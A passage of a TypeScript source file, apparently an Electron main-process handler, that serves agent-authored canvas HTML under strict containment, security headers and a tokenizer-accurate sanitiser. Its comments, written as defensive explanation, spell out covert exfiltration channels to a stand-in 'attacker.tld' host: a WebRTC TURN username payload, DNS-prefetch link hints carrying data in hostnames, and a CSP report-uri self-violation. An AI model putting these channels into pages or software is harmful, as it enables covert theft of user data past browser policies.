// ccc-ux:// — the Agent Canvas serving scheme (spec §3.1, D4).
//
// Content renders from a privileged custom scheme served directly by the main
// process: no localhost server, no open port. URL shape is
// `ccc-ux://<canvasId>/<versionId>/<path>` — the canvas id is the HOST, so each
// canvas is its own origin and storage/service-worker scope cannot leak across
// sessions.
//
// Serving is strictly read-only and confined: a request may only resolve into
// the version's content root (a design version's own directory, or the dist
// root a UAT render registered). Three independent layers enforce that:
//   1. segment filter — every decoded path segment must be a plain name
//      (no '', '.', '..', backslash, colon (Windows ADS/drive), NUL);
//   2. lexical containment — validatePath() re-checks the joined path is
//      under the root;
//   3. physical containment — the realpath of the served file must live under
//      the realpath of the root, so a symlink planted INSIDE the tree cannot
//      escape it (the root itself may legitimately be a link — worktrees,
//      junctioned resources — so it is trusted as the anchor, same stance as
//      mkdirSecure's trust roots);
//   4. object discipline — the file is opened ONCE and every check runs on
//      that fd (readCheckedFile), and a file with more than one name is
//      refused. Layer 3 is about paths; a HARD LINK is a second name for an
//      inode elsewhere, so it satisfies layer 3 completely while serving
//      someone else's bytes (adversarial review 2026-08-15 walked an OAuth
//      token out of a served root through one). Layer 4 binds the ENTRY
//      document in both modes and every file of a design version; a UAT
//      subordinate asset is exempt and logged, because hardlink-deduplicated
//      build output is ordinary and refusing it broke real dist trees (see
//      serveFile).
//
// And the version's ROOT is not global: `getServableVersion` re-checks a UAT
// distRoot against the roots registered for the canvas's OWNING SESSION, which
// are revoked when that session's PTY exits.
//
// Every HTML response gets the bridge script injected (spec: template-injected
// at serve time — content authors never bundle it) and a restrictive
// per-mode Content-Security-Policy header. `bypassCSP` is never set.

import { protocol } from 'electron'
import * as fs from 'fs'
import * as path from 'path'
import {
  CANVAS_ANALYSIS_PATH,
  CANVAS_BRIDGE_PATH,
  CANVAS_ID_RE,
  CANVAS_VERSION_ID_RE,
  CCC_UX_SCHEME,
} from '../../shared/canvas'
import { validatePath } from '../utils/path-validator'
import { readCheckedFile } from '../utils/safe-file-read'
import { getServableVersion, isHtmlDocumentPath, ServableVersion } from './canvas-store'
import bridgeSource from 'virtual:canvas-bridge'
import analysisSource from 'virtual:canvas-analysis'

// `connect-src 'self'` IS NOT EGRESS CONFINEMENT — the directive list below is,
// and only because of the last three lines of it (adversarial review,
// 2026-08-15). Fetch-directives govern FETCHES; a canvas document has channels
// that are not fetches, and every one of them reaches the network with an
// attacker-chosen label attached:
//
//   - WebRTC. `new RTCPeerConnection({iceServers:[{urls:'turn:x.attacker.tld',
//     username:'<payload>'}]})` does DNS + UDP during ICE gathering and no
//     fetch-directive covers it. Chromium's default is allow, so the CSP3
//     `webrtc 'block'` directive is the only thing that stops it.
//   - `<link rel=dns-prefetch|preconnect|prefetch|prerender>` — a resolver /
//     connection hint, not a fetch, so no CSP directive applies. One hostname
//     per chunk (~63 bytes a label, ≤253 a name) makes it a working channel:
//     every unique name is a query at the attacker's authoritative resolver.
//     The comment that stood here named two mitigations and NEITHER held
//     (adversarial review, 2026-08-16). It cited the Permissions-Policy header
//     below — which has no feature covering resource hints, as this file itself
//     admits sixty lines further down — and "only ever reached through a UAT
//     root the user's own session registered", which is simply false:
//     `renderVersion({mode:'design'})` serves AGENT-AUTHORED html out of the
//     version's own directory and registers no root at all, and that is the
//     agent's ordinary authoring path. What is actually there now:
//       1. `X-DNS-Prefetch-Control: off` on every response (baseHeaders). This
//          is the load-bearing half, because it is the only one that reaches a
//          hint the page's own SCRIPT creates — no serve-time rewrite can see
//          those. How far it reaches (it governs DNS prefetching; whether
//          Chromium's preconnect predictor honours it is a separate question)
//          is a property of the running engine that a jsdom unit test cannot
//          establish. It needs a real-Chromium confirmation and has not had one.
//       2. `sanitizeServedHtml` drops those `rel` tokens at serve time, which
//          covers the parser-time hints — the only kind a static dist page has.
//     Residual, stated plainly rather than papered over: a script-created hint
//     is outside the strip and rests entirely on (1).
//   - a page-authored `<meta http-equiv="Content-Security-Policy" …
//     report-uri=…>` plus a deliberate self-violation. Violation reports are
//     not subject to `connect-src`/`form-action`. `sanitizeServedHtml` removes
//     the element at serve time.
//
//     What that is NOT is the claim this file used to make — that the page
//     "cannot declare one at all". A scanner is not the parser, and the first
//     one here disagreed with the WHATWG tokenizer in both directions (it left
//     a meta standing after `<!-->`, and it spliced meta-shaped TEXT out of a
//     `<textarea>`). The scan below is now measured against the tokenizer case
//     by case in tests/unit/main/canvas-content-egress.test.ts. Even so, the
//     honest floor is the engine's, not the scanner's: a `<meta>` policy can
//     only INTERSECT the served header policy, never loosen it, and Chromium
//     ignores `report-uri`/`report-to` delivered by `<meta>`. The failure a
//     surviving pragma would actually cause is a page declaring
//     `script-src 'none'` to kill the injected bridge, i.e. canvas_snapshot and
//     canvas_review failing invisibly.
//
// This matters more here than it would for a browser tab: a UAT `contentRoot`
// can be a whole project directory that the page reads same-origin, and
// `captureHeadless` mounts and executes the document off-screen with no UI and
// no approval prompt.
//
// Spec §3.1 default policy, with an explicit script-src and the same
// defense-in-depth backstops the app renderer carries (object/base/form).
// UAT builds are real static bundles — external same-origin scripts only.
const UAT_CSP =
  "default-src 'self'; " +
  "script-src 'self'; " +
  "img-src 'self' data:; " +
  "style-src 'self' 'unsafe-inline'; " +
  "font-src 'self' data:; " +
  "connect-src 'self'; " +
  "webrtc 'block'; " +
  "object-src 'none'; " +
  "base-uri 'self'; " +
  "form-action 'self'"

// Design documents are agent-authored SINGLE-FILE mockups: inline <script> is
// their normal shape, so design mode adds 'unsafe-inline' for scripts. The
// frame stays sandboxed, per-canvas-origin, with no network egress beyond
// 'self' — the relaxation widens what the document may run, not what it may
// reach. (D14: the canvas must not degrade content below what a browser shows.)
const DESIGN_CSP =
  "default-src 'self'; " +
  "script-src 'self' 'unsafe-inline'; " +
  "img-src 'self' data:; " +
  "style-src 'self' 'unsafe-inline'; " +
  "font-src 'self' data:; " +
  "connect-src 'self'; " +
  "webrtc 'block'; " +
  "object-src 'none'; " +
  "base-uri 'self'; " +
  "form-action 'self'"

/**
 * Powerful features a canvas document may never use, denied for EVERY origin
 * (`=()` is the empty allowlist).
 *
 * The iframe `allow` attribute is the other half and both are needed: `allow`
 * is the parent DELEGATING, this header is the document's own ceiling, and a
 * document reached by a route that did not set `allow` (a nested frame, a
 * future mount site) still lands under this. Unknown feature names are ignored
 * by the parser, so listing more than Chromium implements costs nothing and
 * covers a feature arriving in a later Chromium than the one this shipped on.
 *
 * Note what this does NOT cover: `rel=dns-prefetch`/`preconnect` have no
 * Permissions-Policy feature and no CSP directive — this header was once cited
 * as their mitigation and it never covered them. They are handled by
 * `X-DNS-Prefetch-Control: off` plus the serve-time strip. See the CSP note above.
 */
export const CANVAS_PERMISSIONS_POLICY = [
  'accelerometer',
  'ambient-light-sensor',
  'attribution-reporting',
  'autoplay',
  'battery',
  'bluetooth',
  'browsing-topics',
  'camera',
  'compute-pressure',
  'display-capture',
  'encrypted-media',
  'fullscreen',
  'gamepad',
  'geolocation',
  'gyroscope',
  'hid',
  'idle-detection',
  'local-fonts',
  'magnetometer',
  'microphone',
  'midi',
  'payment',
  'picture-in-picture',
  'publickey-credentials-create',
  'publickey-credentials-get',
  'screen-wake-lock',
  'serial',
  'speaker-selection',
  'storage-access',
  'usb',
  'web-share',
  'window-management',
  'xr-spatial-tracking',
]
  .map((feature) => `${feature}=()`)
  .join(', ')

const MIME_BY_EXT: Record<string, string> = {
  '.html': 'text/html; charset=utf-8',
  '.htm': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.mjs': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.webp': 'image/webp',
  '.avif': 'image/avif',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf',
  '.otf': 'font/otf',
  '.map': 'application/json; charset=utf-8',
  '.txt': 'text/plain; charset=utf-8',
  '.wasm': 'application/wasm',
  '.webm': 'video/webm',
  '.mp4': 'video/mp4',
}

const MAX_SERVED_FILE_BYTES = 64 * 1024 * 1024

function notFound(): Response {
  // Deliberately uniform and detail-free: traversal attempts, unknown
  // canvases, and genuinely missing files are indistinguishable outside.
  return new Response('Not found', {
    status: 404,
    headers: { 'Content-Type': 'text/plain; charset=utf-8', 'X-Content-Type-Options': 'nosniff' },
  })
}

function baseHeaders(contentType: string, csp?: string): Record<string, string> {
  const headers: Record<string, string> = {
    'Content-Type': contentType,
    'X-Content-Type-Options': 'nosniff',
    'Cache-Control': 'no-store',
    // On EVERY response, not just documents: the bridge and the analysis chunk
    // are served from this same handler, and a header that is conditional is a
    // header someone eventually forgets to make conditional correctly.
    'Permissions-Policy': CANVAS_PERMISSIONS_POLICY,
    // The half of the resource-hint defence that a serve-time markup rewrite
    // cannot be: it is the only thing that reaches a hint created by the page's
    // own script (`document.createElement('link')`). Unconditional for the same
    // reason as the line above, and because a hint can be injected into any
    // document this handler serves.
    'X-DNS-Prefetch-Control': 'off',
  }
  if (csp) headers['Content-Security-Policy'] = csp
  return headers
}

// ---------------------------------------------------------------------------
// Serve-time markup sanitisation: page-authored CSP pragmas + egress hints
//
// This is a scanner, not a parser, and the only defensible way to run one is to
// walk the same states the WHATWG tokenizer does over the constructs that
// decide where a tag IS. The first version of this code did not, and an
// adversarial pass measured it against parse5 (the tokenizer Chromium
// implements) and broke it in both directions — documents where it left a live
// element standing, and documents where it deleted bytes the browser keeps as
// inert TEXT, which corrupts working dist output. Every one of those is a named
// case in that test file, each stated as a differential against the parser
// rather than against a reading of the spec.
//
// Why the scanner survived that review rather than being replaced by "refuse
// any document containing a CSP meta", which has no parser differential at all:
// a CSP `<meta>` is ORDINARY in real dist output. This repo's own built
// artifact (`out/renderer/index.html`) ships one, `resources/splash/index.html`
// ships one, and it is the standard recommendation for a statically-hosted SPA
// because a header never reaches a `file://` document. Refusing would turn a
// normal `dist/` into a blank UAT pane, i.e. trade a bounded correctness bug
// (see the CSP note at the top of this file: a meta policy can only tighten)
// for a guaranteed one.
// ---------------------------------------------------------------------------

/**
 * Decode the character references an HTML tokenizer would decode inside an
 * ATTRIBUTE VALUE, so a comparison against that value cannot be dodged by
 * spelling one letter as a numeric reference.
 *
 * Attribute NAMES are taken literally by the tokenizer — no references — which
 * is why the scan below matches the name `http-equiv` as a plain string and
 * only decodes the VALUE. The trailing semicolon is optional because a numeric
 * reference without one is a parse error the tokenizer recovers from by
 * consuming the reference anyway (`&#x63` decodes to `c`).
 *
 * Named references are not decoded: none of them produce an ASCII letter, so
 * none can smuggle a character into `content-security-policy`.
 */
const ATTR_CHAR_REF_SOURCE = '&#(x[0-9a-f]+|[0-9]+);?'

function decodeAttrCharRefs(value: string): string {
  return value.replace(new RegExp(ATTR_CHAR_REF_SOURCE, 'gi'), (whole, digits: string) => {
    const hex = digits[0] === 'x' || digits[0] === 'X'
    const code = Number.parseInt(hex ? digits.slice(1) : digits, hex ? 16 : 10)
    if (!Number.isFinite(code) || code < 0 || code > 0x10ffff) return whole
    try {
      return String.fromCodePoint(code)
    } catch {
      return whole
    }
  })
}

/** The tokenizer's ASCII whitespace, and ONLY it. `/\s/` is a wider set: put a
 *  U+00A0 between `<meta` and `http-equiv` and the tokenizer reads the whole run
 *  as ONE TAG NAME — not a `<meta>` element at all — while a scanner using
 *  `/\s/` sees a meta there and deletes it. */
function isTagSpace(c: string | undefined): boolean {
  return c === ' ' || c === '\t' || c === '\n' || c === '\f' || c === '\r'
}

/** A tag name may only begin with an ASCII letter; `<3` and `<-- x` are TEXT. */
function isAsciiAlpha(c: string | undefined): boolean {
  return c !== undefined && ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z'))
}

/** End of a tag name / of an attribute name / of an unquoted value. */
function endsName(c: string | undefined): boolean {
  return c === undefined || isTagSpace(c) || c === '/' || c === '>'
}

interface ScannedAttr {
  /** The value exactly as written between the quotes (or bare). */
  value: string
  /** Half-open span of that raw text in the document, for a surgical rewrite. */
  start: number
  end: number
}

interface ScannedTag {
  /** Lowercased tag name. */
  name: string
  /** Index one past the tag's closing '>' (or the end of the string). */
  end: number
  attrs: Map<string, ScannedAttr>
  /**
   * The tokenizer's self-closing FLAG — a '/' immediately before the '>', and
   * nothing else. It is ignored for HTML elements (`<div/>` opens a div), which
   * is why nothing used it before; a FOREIGN element honours it, so
   * `<svg/>` opens no foreign content and `<svg><desc/>` no integration point.
   */
  selfClosing: boolean
}

/**
 * Read one tag starting at `start` (which must point at its '<'), returning its
 * name, its attributes and where it ends.
 *
 * Quote-aware, because `[^>]*>` is not: a `report-uri https://x/?a=>b` inside a
 * quoted value ends the match early, and a scanner that stops there disagrees
 * with the browser about where the tag is.
 */
function scanTag(html: string, start: number): ScannedTag {
  const attrs = new Map<string, ScannedAttr>()
  let i = start + 1
  if (html[i] === '/') i++ // end tag
  const nameStart = i
  while (i < html.length && !endsName(html[i])) i++
  const name = html.slice(nameStart, i).toLowerCase()
  while (i < html.length) {
    // The self-closing flag is set only when the '/' is the character right
    // before the '>' — `<svg / >` is not self-closing, and a trailing slash
    // inside an UNQUOTED value (`<svg a=b/>`) belongs to the value, which is
    // why this is tracked here rather than read off `html[end - 2]`.
    let slashRunToGt = false
    while (i < html.length && (isTagSpace(html[i]) || html[i] === '/')) {
      slashRunToGt = html[i] === '/'
      i++
    }
    if (i >= html.length) break
    if (html[i] === '>') return { name, end: i + 1, attrs, selfClosing: slashRunToGt }
    let attrName = ''
    while (i < html.length && !endsName(html[i]) && html[i] !== '=') attrName += html[i++]
    while (i < html.length && isTagSpace(html[i])) i++
    let start_ = i
    let end_ = i
    if (html[i] === '=') {
      i++
      while (i < html.length && isTagSpace(html[i])) i++
      const quote = html[i]
      if (quote === '"' || quote === "'") {
        i++
        start_ = i
        while (i < html.length && html[i] !== quote) i++
        end_ = i
        i++ // past the closing quote
      } else {
        start_ = i
        while (i < html.length && !isTagSpace(html[i]) && html[i] !== '>') i++
        end_ = i
      }
    }
    // DUPLICATE ATTRIBUTES: the tokenizer keeps the FIRST and DROPS the rest
    // ("if there is already an attribute on the token with the exact same name
    // … this attribute must be removed"). `Map.set` kept the LAST, so
    // `<meta http-equiv=content-security-policy http-equiv=charset …>` read as
    // `charset` here and as the pragma in the browser — the element survived.
    const key = attrName.toLowerCase()
    if (key.length > 0 && !attrs.has(key)) attrs.set(key, { value: html.slice(start_, end_), start: start_, end: end_ })
  }
  return { name, end: html.length, attrs, selfClosing: false }
}

/**
 * Index one past the comment that starts at `lt` (`html[lt]` is the '<' of
 * `<!--`), following the tokenizer's comment states rather than "the next
 * `-->`". Three of them are not that:
 *
 *   - `<!-->` and `<!--->` close IMMEDIATELY (abrupt-closing-of-empty-comment).
 *     `indexOf('-->')` swallowed the rest of the document, so a `<meta>` after
 *     one was never scanned — it is a live element to the browser.
 *   - `--!>` closes a comment (incorrectly-closed-comment). Same swallow.
 *   - EOF inside a comment ends it; nothing after it exists.
 */
function endOfComment(html: string, lt: number): number {
  let i = lt + 4 // past '<!--'
  if (html[i] === '>') return i + 1 // <!-->
  if (html[i] === '-' && html[i + 1] === '>') return i + 2 // <!--->
  while (i < html.length) {
    const dash = html.indexOf('--', i)
    if (dash < 0) return html.length
    let j = dash + 2
    while (html[j] === '-') j++ // comment-end state stays on a run of dashes
    if (html[j] === '>') return j + 1
    if (html[j] === '!') {
      // comment-end-bang: '>' closes, '-' returns to comment-end-dash.
      if (html[j + 1] === '>') return j + 2
      i = j + 1
      continue
    }
    if (j >= html.length) return html.length
    i = j // back to comment state, reconsuming this character
  }
  return html.length
}

/** A bogus comment (`<!DOCTYPE …>`, `<![CDATA[…]]>`, `<?x>`, `</3>`) ends at the
 *  first '>' — including inside a DOCTYPE's quoted identifier, where the
 *  tokenizer treats '>' as an abrupt end rather than as data. */
function endOfBogusComment(html: string, lt: number): number {
  const gt = html.indexOf('>', lt)
  return gt < 0 ? html.length : gt + 1
}

/**
 * Contents are not markup at all (RAWTEXT).
 *
 * `noscript` is in this set because of a property of the DEPLOYMENT, not of the
 * element: its contents are RAWTEXT only when scripting is ENABLED, and every
 * mount site of canvas content enables it — the visible pane
 * (`AgentCanvasPane`) and the off-screen capture frame
 * (`canvas-headless-capture`) both carry
 * `sandbox="allow-scripts allow-same-origin allow-forms"`, and the injected
 * bridge (so canvas_snapshot and canvas_review) does not work at all without
 * it. The comment that stood here had it backwards (adversarial review,
 * 2026-08-16): it justified visiting inside `<noscript>` as refusing to
 * "treat a live element as inert", when in THIS frame the visiting was the
 * error — editing bytes the canvas frame never parses as markup and never
 * renders.
 *
 * Residual, in the direction that matters: mount canvas content with scripting
 * OFF and a `<link rel=dns-prefetch>` inside a `<noscript>` becomes live markup
 * that is no longer stripped. `X-DNS-Prefetch-Control: off` (baseHeaders) is
 * what covers it there, and such a frame is already broken (no bridge, no
 * snapshot). Note the oracle for this one element is a scripting-ENABLED parse;
 * jsdom's default is scripting OFF, so the differential has to ask for it.
 */
const RAW_TEXT_ELEMENTS = new Set(['script', 'style', 'xmp', 'iframe', 'noembed', 'noframes', 'noscript'])
/** Contents are text with character references (RCDATA) — still not markup, so a
 *  `<meta …>` written inside one is VISIBLE TEXT the browser shows. Splicing it
 *  out silently edited the page's own content.
 *
 *  BOTH sets are HTML-CONTENT-ONLY. Inside `<svg>`/`<math>` these names lose
 *  their content model completely, which is what the foreign-content tracking
 *  below exists for — it used to be a documented residual right here, and
 *  measurement showed it was not the harmless one the note claimed. */
const RCDATA_ELEMENTS = new Set(['textarea', 'title'])

// ---------------------------------------------------------------------------
// Foreign content (SVG / MathML)
//
// Inside `<svg>` and `<math>` the names above mean nothing: `style`, `script`,
// `textarea`, `xmp`, `iframe`, `noembed` and `title` are ordinary foreign
// elements whose children are MARKUP. A walker that skips to their end tag
// anyway is wrong in both directions, and the second one is not theoretical
// (adversarial review, 2026-08-16 — the differential corpus in
// tests/unit/main/canvas-content-egress.test.ts measures every claim here
// against parse5 rather than against a reading of the spec):
//
//   <svg><style><meta><link rel=dns-prefetch href="//<chunk>.attacker.tld">…
//
// `<meta>` is a BREAKOUT element: the parser pops out of foreign content there
// and everything after it is HTML again, so those links are LIVE html `<link>`
// elements with a working relList — one DNS query per chunk at the attacker's
// own resolver, with the entire hint strip walked past because the walker was
// still skipping to `</style>`. Same shape with `<svg><script>`,
// `<svg><textarea>`, `<svg><xmp>`, `<svg><iframe>`, `<svg><noembed>`, and with
// `<svg><title>`, which is an HTML integration point where a `<link>` is live
// HTML outright. THAT is why the awareness below is here and not a comment:
// the pragma half of it would have been inert (an `<svg>` can never be a child
// of `<head>` — the tree builder pops head and opens body before it processes
// one — and Chromium only honours a CSP `<meta>` that IS a head child), but the
// hint half is a working channel and the hint half is the one CSP cannot cover.
//
// The other direction is a bounded over-strip of the page's own markup:
// `<svg><link rel="dns-prefetch">` is an SVG-namespace `link` with no relList
// and no hint, and the walker deleted it.
//
// What is modeled:
//   - ENTER on `<svg>`/`<math>` in HTML content, unless the start tag is
//     self-closing (a foreign element honours that flag, an HTML one ignores it);
//   - HTML PARSING RESUMES inside an HTML integration point — SVG
//     `foreignObject`/`desc`/`title`, MathML `annotation-xml` with an HTML
//     encoding, and the MathML text integration points — where `<style>` is
//     RAWTEXT again and a `<link rel=dns-prefetch>` is a live hint;
//   - LEAVE on the matching end tag, on a breakout start tag, or on `</p>` /
//     `</br>` (measured: of eighteen end tags tried inside `<svg><style>`,
//     exactly those two put the following `<link>` in the HTML namespace, and
//     they pop only as far as the nearest integration point);
//   - in foreign content only breakout tags are visited, because only they are
//     HTML elements — which is exactly what keeps `<svg><link>` alone.
//
// Residuals, both under-strip, both bounded to a PRAGMA and never to a hint:
// `<mglyph>`/`<malignmark>` inside a MathML text integration point return to
// foreign parsing and are not modeled (measured: a `<link>` under one stays
// MathML-namespace and inert, a `<meta>` breaks out and survives); and a CDATA
// section is consumed by the bogus-comment path rather than to `]]>`, which the
// corpus measures landing in the same place for both element names.
// ---------------------------------------------------------------------------

/** Start tags that BREAK OUT of foreign content: the parser pops back to HTML
 *  content and inserts them as HTML elements, so everything after one is HTML
 *  again. (`font` only when it carries color/face/size — measured both ways.) */
const FOREIGN_BREAKOUT_ELEMENTS = new Set([
  'b', 'big', 'blockquote', 'body', 'br', 'center', 'code', 'dd', 'div', 'dl', 'dt', 'em', 'embed',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'hr', 'i', 'img', 'li', 'listing', 'menu', 'meta',
  'nobr', 'ol', 'p', 'pre', 'ruby', 's', 'small', 'span', 'strong', 'strike', 'sub', 'sup', 'table',
  'tt', 'u', 'ul', 'var',
])

/** End tags that leave foreign content without naming an open foreign element.
 *  Both are the HTML-content rules that SYNTHESISE an element (`</br>` acts as
 *  `<br>`; `</p>` opens and closes one), which is why only these two do it. */
const FOREIGN_BREAKOUT_END_TAGS = new Set(['p', 'br'])

/** SVG elements that are HTML integration points: HTML parsing resumes inside. */
const SVG_HTML_INTEGRATION_POINTS = new Set(['foreignobject', 'desc', 'title'])

/** MathML text integration points; `annotation-xml` is conditional, see below. */
const MATHML_TEXT_INTEGRATION_POINTS = new Set(['mi', 'mo', 'mn', 'ms', 'mtext'])

type ForeignNamespace = 'svg' | 'math'

interface ForeignFrame {
  /** Lowercased name of the tag that opened this frame; its end tag closes it. */
  name: string
  /** 'foreign' — children are foreign markup. 'html' — an integration point,
   *  inside which HTML parsing (and with it RAWTEXT/RCDATA) resumes. */
  kind: 'foreign' | 'html'
  /** The foreign root this frame sits under, which decides what counts as an
   *  integration point below it: `<svg><math>` is an SVG-namespace `math`, not
   *  MathML, so its `<ms>` is NOT a text integration point. */
  namespace: ForeignNamespace
}

function breaksOutOfForeignContent(tag: ScannedTag): boolean {
  if (FOREIGN_BREAKOUT_ELEMENTS.has(tag.name)) return true
  return tag.name === 'font' && (tag.attrs.has('color') || tag.attrs.has('face') || tag.attrs.has('size'))
}

function isHtmlIntegrationPoint(tag: ScannedTag, namespace: ForeignNamespace): boolean {
  if (namespace === 'svg') return SVG_HTML_INTEGRATION_POINTS.has(tag.name)
  if (MATHML_TEXT_INTEGRATION_POINTS.has(tag.name)) return true
  if (tag.name !== 'annotation-xml') return false
  const encoding = tag.attrs.get('encoding')
  if (encoding === undefined) return false
  // The encoding decides it: without one (or with any other) the element is
  // foreign and a `<meta>` inside still breaks out. Decoded and trimmed for the
  // same reason `http-equiv` is.
  const value = decodeAttrCharRefs(encoding.value).trim().toLowerCase()
  return value === 'text/html' || value === 'application/xhtml+xml'
}

/**
 * Index of the '<' that opens `</name`'s end tag, or the end of the string.
 *
 * The boundary check is the point: `</scriptx` is NOT an end tag (the tokenizer
 * requires whitespace, '/' or '>' after the name, otherwise the text is flushed
 * and it stays in script data). A plain `indexOf('</script')` ended the skip
 * there and resumed scanning markup that is still inside the script.
 */
function endOfTextContent(html: string, lower: string, from: number, name: string): number {
  const needle = `</${name}`
  let i = from
  for (;;) {
    const at = lower.indexOf(needle, i)
    if (at < 0) return html.length
    if (endsName(html[at + needle.length])) return at
    i = at + needle.length
  }
}

/** A replacement of `[start, end)` with `text`. Empty text removes the range. */
interface MarkupEdit {
  start: number
  end: number
  text: string
}

/**
 * Walk `html` the way the tokenizer's DATA state does, calling `visit` for every
 * START TAG that is really one, and applying whatever edits it asks for.
 *
 * The regions that are skipped are the ones that decide where a tag is:
 * comments and bogus comments, RAWTEXT/RCDATA contents, and — this is the one a
 * naive scanner always misses — THE INSIDE OF A PREVIOUS TAG. `<div
 * title="<!--">` had its attribute value read as the start of a comment, which
 * swallowed everything to the next `-->`; and `<div data-x="<meta http-equiv=…>">`
 * had its attribute gutted, because the scanner found a `<meta` there and
 * spliced it out. Tags are now consumed whole, so neither is ever visible.
 *
 * `<template>` contents are tracked but NOT visited: they parse as elements, in
 * a fragment that is not in a document, so a pragma there never applies and a
 * hint there never resolves — removing them was pure corruption of the page's
 * own markup.
 *
 * `frames` is the foreign-content stack described above the table of breakout
 * elements: its top decides whether the names in RAW_TEXT_ELEMENTS /
 * RCDATA_ELEMENTS mean anything at all right now.
 */
function rewriteMarkup(html: string, visit: (tag: ScannedTag, start: number) => MarkupEdit | null): string {
  // One lowercased copy for the end-tag searches: doing it per `<script>` would
  // make a bundle with many script tags quadratic.
  const lower = html.toLowerCase()
  const edits: MarkupEdit[] = []
  let templateDepth = 0
  // Empty, or a 'html' frame on top, means HTML content; a 'foreign' frame on
  // top means we are inside SVG/MathML markup.
  const frames: ForeignFrame[] = []
  const inForeignContent = (): boolean => frames.length > 0 && frames[frames.length - 1].kind === 'foreign'
  const leaveForeignContent = (): void => {
    while (inForeignContent()) frames.pop()
  }
  let i = 0
  while (i < html.length) {
    const lt = html.indexOf('<', i)
    if (lt < 0) break
    const next = html[lt + 1]
    if (next === '!') {
      i = html.startsWith('<!--', lt) ? endOfComment(html, lt) : endOfBogusComment(html, lt)
      continue
    }
    if (next === '?') {
      i = endOfBogusComment(html, lt)
      continue
    }
    if (next === '/') {
      if (!isAsciiAlpha(html[lt + 2])) {
        i = endOfBogusComment(html, lt)
        continue
      }
      const tag = scanTag(html, lt)
      let open = -1
      for (let f = frames.length - 1; f >= 0; f--) {
        if (frames[f].name === tag.name) {
          open = f
          break
        }
      }
      if (open >= 0) {
        // Closes that element — and with it anything still open inside it.
        frames.length = open
      } else if (inForeignContent() && FOREIGN_BREAKOUT_END_TAGS.has(tag.name)) {
        leaveForeignContent()
      } else if (tag.name === 'template' && templateDepth > 0) {
        templateDepth--
      }
      i = tag.end
      continue
    }
    if (!isAsciiAlpha(next)) {
      i = lt + 1 // a bare '<' is text
      continue
    }
    const tag = scanTag(html, lt)
    if (inForeignContent() && !breaksOutOfForeignContent(tag)) {
      // A FOREIGN element: not an HTML `<meta>`/`<link>` however it is spelled,
      // so never visited, and its children are markup rather than text however
      // it is named, so never skipped.
      const namespace = frames[frames.length - 1].namespace
      if (!tag.selfClosing && isHtmlIntegrationPoint(tag, namespace)) {
        frames.push({ name: tag.name, kind: 'html', namespace })
      }
      i = tag.end
      continue
    }
    leaveForeignContent() // a breakout tag, if we were in foreign content at all
    if (templateDepth === 0) {
      const edit = visit(tag, lt)
      if (edit) edits.push(edit)
    }
    if (tag.name === 'template') {
      // A self-closing flag on `<template>` is ignored in HTML content (parse
      // error), so this opens one either way.
      templateDepth++
      i = tag.end
    } else if ((tag.name === 'svg' || tag.name === 'math') && !tag.selfClosing) {
      frames.push({ name: tag.name, kind: 'foreign', namespace: tag.name })
      i = tag.end
    } else if (RAW_TEXT_ELEMENTS.has(tag.name) || RCDATA_ELEMENTS.has(tag.name)) {
      i = endOfTextContent(html, lower, tag.end, tag.name)
    } else {
      i = tag.end
    }
  }
  if (edits.length === 0) return html // the common case allocates nothing
  let out = ''
  let copiedFrom = 0
  for (const edit of edits) {
    out += html.slice(copiedFrom, edit.start) + edit.text
    copiedFrom = edit.end
  }
  return out + html.slice(copiedFrom)
}

/** The two pragmas that deliver a policy — and with it a report endpoint. */
const CSP_PRAGMA_RE = /^content-security-policy(-report-only)?$/

/**
 * `rel` tokens that reach the network WITHOUT being a fetch, so no CSP
 * fetch-directive governs them. See the egress note at the top of this file.
 */
const EGRESS_HINT_RELS = new Set(['dns-prefetch', 'preconnect', 'prefetch', 'prerender'])

/** One `rel` token: what the browser sees after decoding, and the half-open
 *  span of RAW text it came from so a rewrite can put the original bytes back. */
interface RelToken {
  decoded: string
  rawStart: number
  rawEnd: number
}

/**
 * Split a raw `rel` value the way a DOMTokenList does — on ASCII whitespace in
 * the DECODED value — while keeping every token's raw span.
 *
 * Splitting the RAW text and classifying the pieces after decoding is a
 * MEASURED over-strip (adversarial review, 2026-08-16):
 * `rel="stylesheet&#32;dns-prefetch"` is one raw token that decodes to two, so
 * it classified as a hint, nothing was left to keep, and the whole element went
 * — taking the page's stylesheet with it. A `&#9;` separator does the same, and
 * so would `icon`/`preload`.
 *
 * Writing kept tokens back from their RAW spans is what keeps the rewrite
 * injection-proof and is not incidental: a decoded token can contain the quote
 * that would end the attribute (`stylesheet&#34; onload=&#34;…`), so `&#34;`
 * has to go back as `&#34;`.
 */
function relTokens(raw: string): RelToken[] {
  const tokens: RelToken[] = []
  let current: RelToken | null = null
  const push = (text: string, from: number, to: number): void => {
    if (isTagSpace(text)) {
      current = null // a separator, however it was spelled
      return
    }
    if (current === null) {
      current = { decoded: text, rawStart: from, rawEnd: to }
      tokens.push(current)
    } else {
      current.decoded += text
      current.rawEnd = to
    }
  }
  const ref = new RegExp(ATTR_CHAR_REF_SOURCE, 'gi')
  let at = 0
  for (;;) {
    ref.lastIndex = at
    const match = ref.exec(raw)
    const upto = match ? match.index : raw.length
    for (let k = at; k < upto; k++) push(raw[k], k, k + 1)
    if (match === null) break
    // Every character the reference decodes to maps back to the WHOLE
    // reference, so a kept token that contains one carries it out verbatim.
    for (const char of decodeAttrCharRefs(match[0])) push(char, match.index, match.index + match[0].length)
    at = match.index + match[0].length
  }
  return tokens
}

/**
 * Remove what canvas content may not author: a page-authored CSP pragma, and
 * the `<link>` resource hints that egress without being a fetch.
 *
 * WHY THE PRAGMA (adversarial review 2026-08-15, egress finding #3). A document
 * that declares its own policy with `report-uri https://attacker.tld/…` and then
 * deliberately violates it gets a channel that `connect-src` and `form-action`
 * do not govern, carrying page-chosen data in `blocked-uri`. Chromium ignores
 * `report-uri`/`report-to` delivered via `<meta>` — that is a property of one
 * engine's conformance rather than a boundary this path leans on — and a meta
 * policy can only intersect the served header, so what removal actually buys is
 * that hostile content cannot declare `script-src 'none'` to kill the injected
